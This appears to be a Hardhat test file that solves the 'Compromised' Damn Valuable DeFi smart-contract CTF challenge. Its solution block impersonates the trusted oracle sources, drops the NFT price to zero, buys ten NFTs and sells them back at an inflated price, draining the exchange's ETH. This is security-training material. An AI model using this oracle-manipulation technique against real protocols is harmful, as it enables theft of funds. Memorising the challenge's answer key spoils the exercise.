const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

describe("Compromised challenge", function () {
  const sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
  ];

  let deployer, player;
  const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther("9990");
  const INITIAL_NFT_PRICE = ethers.utils.parseEther("999");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    const ExchangeFactory = await ethers.getContractFactory(
      "Exchange",
      deployer
    );
    const DamnValuableNFTFactory = await ethers.getContractFactory(
      "DamnValuableNFT",
      deployer
    );
    const TrustfulOracleFactory = await ethers.getContractFactory(
      "TrustfulOracle",
      deployer
    );
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory(
      "TrustfulOracleInitializer",
      deployer
    );

    // Initialize balance of the trusted source addresses
    for (let i = 0; i < sources.length; i++) {
      await ethers.provider.send("hardhat_setBalance", [
        sources[i],
        "0x1bc16d674ec80000", // 2 ETH
      ]);
      expect(await ethers.provider.getBalance(sources[i])).to.equal(
        ethers.utils.parseEther("2")
      );
    }

    // Player starts with 0.1 ETH in balance
    await ethers.provider.send("hardhat_setBalance", [
      player.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      ethers.utils.parseEther("0.1")
    );

    // Deploy the oracle and setup the trusted sources with initial prices
    this.oracle = await TrustfulOracleFactory.attach(
      await (
        await TrustfulOracleInitializerFactory.deploy(
          sources,
          ["DVNFT", "DVNFT", "DVNFT"],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )
      ).oracle()
    );

    // Deploy the exchange and get the associated ERC721 token
    this.exchange = await ExchangeFactory.deploy(this.oracle.address, {
      value: EXCHANGE_INITIAL_ETH_BALANCE,
    });
    this.nftToken = await DamnValuableNFTFactory.attach(
      await this.exchange.token()
    );
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const setOraclePrice = async (oracle, source, price) => {
      await ethers.provider.send("hardhat_impersonateAccount", [source]);
      const trustedSource = await ethers.getSigner(source);
      await oracle.connect(trustedSource).postPrice("DVNFT", price);
      await ethers.provider.send("hardhat_stopImpersonatingAccount", [source]);
    };

    // 1. impersonate the address of the sources and set the prices of `DVNFT` to 1 wei
    await setOraclePrice(
      this.oracle,
      "0xA73209FB1a42495120166736362A1DfA9F95A105",
      0
    );
    await setOraclePrice(
      this.oracle,
      "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
      0
    );
    await setOraclePrice(
      this.oracle,
      "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
      0
    );

    // 2. purchase 10 NFTs from exchange
    const NUM_OF_NFTS_TO_BUY = 10;
    const startTokenId = await this.exchange
      .connect(player)
      .callStatic.buyOne({ value: 1 });
    for (let i = 0; i < NUM_OF_NFTS_TO_BUY; i++) {
      await this.exchange.connect(player).buyOne({ value: 1 }); // send one wei to pass `amountPaidInWei > 0`
    }

    // 3. impersonate the address of oracle sources and set the prices to the original price
    const exchangeBalance = await ethers.provider.getBalance(
      this.exchange.address
    );
    const initialPrice = exchangeBalance.div(
      BigNumber.from(NUM_OF_NFTS_TO_BUY)
    );

    await setOraclePrice(
      this.oracle,
      "0xA73209FB1a42495120166736362A1DfA9F95A105",
      initialPrice
    );
    await setOraclePrice(
      this.oracle,
      "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
      initialPrice
    );
    await setOraclePrice(
      this.oracle,
      "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
      initialPrice
    );

    // 4. sell the 10 NFTs back to exchange thereby claiming all funds
    const tokenIdOffset = Number(startTokenId) + NUM_OF_NFTS_TO_BUY;
    for (let i = Number(startTokenId); i < tokenIdOffset; i++) {
      await this.nftToken.connect(player).approve(this.exchange.address, i);
      await this.exchange.connect(player).sellOne(i);
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Exchange must have lost all ETH
    expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq(
      "0"
    );
    // Player's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(player.address)).to.be.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );
    // Player must not own any NFT
    expect(await this.nftToken.balanceOf(player.address)).to.be.eq("0");
    // NFT price shouldn't have changed
    expect(await this.oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
  });
});
